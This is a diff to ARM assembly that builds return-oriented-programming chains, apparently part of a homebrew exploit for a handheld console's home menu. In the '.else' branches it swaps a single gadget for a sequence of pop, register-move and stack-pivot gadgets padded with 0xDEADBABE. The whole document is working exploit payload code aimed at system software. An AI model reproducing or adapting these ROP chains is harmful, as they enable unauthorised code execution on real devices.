@@ -41,8 +41,12 @@ MENU_SLEEP equ ROP_MENU_SLEEPTHREAD
 			.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 				.word MENU_PAD ; r0 (PAD)
 .else
-		.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-				.word MENU_PAD ; r0 (PAD)
+			.word ROP_MENU_POP_R1PC
+				.word MENU_PAD
+			.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+				.word 0xDEADBABE
+				.word ROP_MENU_STACK_PIVOT
+				.word 0xDEADBABE
 .endif
 			.word ROP_MENU_LDR_R0R0_POP_R4PC ; ldr r0, [r0] ; pop {r4, pc}
 				.word MENU_KEYCOMBO ; r4 (keycombo)
@@ -78,8 +82,12 @@ MENU_SLEEP equ ROP_MENU_SLEEPTHREAD
 			.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 				.word 0x00000001 ; r0 (flag)
 .else
-			.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-				.word 0x00000001 ; r0 (flag)
+			.word ROP_MENU_POP_R1PC
+				.word 0x00000001
+			.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+				.word MENU_OBJECT_LOC + 4 - object
+				.word 0xDEADBABE
+				.word 0xDEADBABE
 .endif
 			.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 				.word nssRebootData + MENU_OBJECT_LOC - object ; r1 (PID followed by mediatype and reserved)
@@ -99,8 +107,12 @@ MENU_SLEEP equ ROP_MENU_SLEEPTHREAD
 			.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 				.word 0xFFFFFFFF ; r0
 .else
-			.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-				.word 0xFFFFFFFF ; r0
+			.word ROP_MENU_POP_R1PC
+				.word 0xFFFFFFFF
+			.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+				.word 0xDEADBABE
+				.word 0xDEADBABE
+				.word 0xDEADBABE
 .endif
 			.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 				.word 0x0FFFFFFF ; r1
